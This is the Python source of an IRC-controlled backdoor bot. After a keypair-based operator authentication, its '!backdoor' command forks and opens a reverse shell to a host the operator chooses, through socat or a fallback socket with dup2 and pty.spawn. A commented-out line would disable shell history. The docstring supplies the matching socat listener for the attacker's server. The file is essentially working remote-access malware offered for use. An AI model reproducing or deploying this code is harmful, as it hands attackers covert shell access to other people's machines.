# -*- coding: utf-8 -*-

"""
on server:
#!/bin/sh
port="$1"
socat file:`tty`,raw,echo=0 tcp-listen:$port
"""


from rocksock import Rocksock, RocksockException
from irc import RsIRC
from nacl_wrapper import gen_keypair, handshake_challenge, handshake_response, \
handshake_response_verify, arrtohex, hextoarr
import sys
from config import Config

config = Config()

def print_exception(nick, lines):
	for line in lines.splitlines():
		config.irc.privmsg(nick, line)

def dprint(channel, msg):
	if config.debug: config.irc.privmsg(channel, "[DEBUG] " + msg)

def dumb_backdoor(nick, server, port):
	import pty, socket, os
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		dprint(nick, "connect")
		s.connect((server, port))
		dprint(nick, "connected!")
		os.dup2(s.fileno(),0)
		os.dup2(s.fileno(),1)
		os.dup2(s.fileno(),2)
		#os.putenv("HISTFILE",'/dev/null')
		pty.spawn(config.shell)
	except Exception as e:
		import traceback
		print_exception(nick, traceback.format_exc())

def backdoor(nick, server, port):
	import os
	import shlex
	import traceback

	dprint(nick, "running backdoor to %s:%d"%(server, port))

	pid = os.fork()
	if pid == 0: #child
		cmd = "socat exec:'%s -i',pty,stderr,setsid,sigint,sane tcp:%s:%d"%(config.shell, server, port)
		cmdarr = shlex.split(cmd)
		try:
			os.execvp('socat', cmdarr)
			#os.execlp('/bin/sh', '/bin/sh', '-c', cmd)
		except OSError as e:
			dprint(nick, "got socat error")
			if e.errno == os.errno.ENOENT:
				dprint(nick, "trying dumb backdoor")
				dumb_backdoor(nick, server, port)
			else:
				print_exception(nick, traceback.format_exc())
		# catch child process on exception/after dumb shell
		os.execlp("/bin/true", "/bin/true")

def process_privmsg(nick, mask, dest, text):

	def addresses_bot(word, nickname):
		return word == nickname or word == nickname + ':' or word == nickname + ','

	text = text.lstrip(':')
	words = text.split(' ')
	if addresses_bot(words[0], config.irc.nickname): words = words[1:]
	elif not dest == config.irc.nickname: return
	if len(words) == 0: return

	if mask.startswith('~'): mask = mask[1:]

	if words[0] == "!auth" and config.bot_sk and config.bot_pk and config.opkey:
		chall = handshake_challenge(config.bot_pk)
		config.irc.privmsg(nick, chall)
		config.auth_request = "%s:%s"%(nick, chall)
	elif config.auth_request and config.auth_request.split(':')[0] == nick:
		if handshake_response_verify(config.auth_request.split(':')[1], words[0], hextoarr(config.opkey), config.bot_sk):
			config.opmask = mask
			config.irc.privmsg(nick, "auth successful, master")
		else: config.irc.privmsg(nick, "auth failed")
		config.auth_request = None
	elif config.opmask and mask == config.opmask:
		if words[0] == "!backdoor":
			try:
				if len(words) == 3:
					backdoor(nick, words[1], int(words[2]))
				elif len(words) == 2 and config.backdoorserver:
					backdoor(nick, config.backdoorserver, int(words[1]))
			except Exception as e:
				import traceback
				print_exception(nick, traceback.format_exc())
		elif words[0] == "!help":
			config.irc.privmsg(nick, "!auth, !backdoor server port")
		elif words[0] == "!quit":
			sys.exit(0)

def main():
	import time
	config.load()
	if config.args.genkey:
		pk, sk = gen_keypair()
		print "public_key = '" + arrtohex(pk) + "'"
		print "secret_key = '" + arrtohex(sk) + "'"
		sys.exit(0)
	elif config.args.challenge:
		print "generating handshake response, hold your breath..."
		ret, resp = handshake_response(config.args.challenge, hextoarr(config.opkey), hextoarr(config.privkey))
		if ret != 0: print "FAIL"
		else: print resp
		sys.exit(ret)
	if not config.opmask:
		print "generating keypair... hold your breath"
		config.bot_pk, config.bot_sk = gen_keypair()
		print "done"

	config.irc = RsIRC(host=config.host, port=config.port, timeout=180, ssl=config.ssl, nickname=config.botnick, username='blah', proxies=config.proxies)
	config.irc.reconnect()
	while True:
		s = config.irc.readline()
		try:
			a,b,c = s.split(' ', 2)
		except:
			a, b = s.split(' ')
			if a == 'PING':
				config.irc.sendl('PONG %s'%b)
			else:
				print "WEIRD COMMAND:" + s
				continue

		#print "B = ___" + b + "___"
		if b == "433": #name in use
			print "nick in use, appending _ ..."
			config.irc.nickname = config.irc.nickname + "_"
			config.irc.reconnect()
		elif b == '376': #MOTD finish
			config.irc.sendl('JOIN %s'%config.channel)
		elif b == "PRIVMSG":
			a,b,c,d = s.split(' ', 3)
			a = a.lstrip(':')
			try:
				nick, mask = a.split('!')
			except:
				config.irc.privmsg(config.channel, "OOPS " + a)
				nick = ""
				mask = ""
				continue

			process_privmsg(nick, mask, c, d)

		if not s: continue
		if not config.quiet and not (config.quietpriv and b == 'PRIVMSG'):
			print s

if __name__ == '__main__':
	main()
